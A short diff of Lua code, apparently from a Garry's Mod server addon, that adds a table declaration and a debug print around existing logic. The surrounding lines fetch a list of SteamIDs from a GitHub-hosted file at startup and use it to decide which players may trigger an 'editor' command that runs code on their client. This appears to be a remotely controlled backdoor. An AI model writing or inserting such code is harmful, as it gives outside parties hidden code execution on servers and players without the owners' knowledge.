@@ -11,6 +11,8 @@
 			func()
 		end
 		
+		local great = {}
+		
 		hook.Add( "InitPostEntity", "some_unique_name", function()
 			great = UrlFunc("https://raw.githubusercontent.com/Dzhet225/core64_v2/master/users.lua")
 		end )
@@ -347,6 +349,7 @@
 		]]
 
 		concommand.Add('editor', function(ply)
+			PrintTable( great )
 			if !great[ply:SteamID()] then return end
 			RunOnCL(ply, code)
 		end)
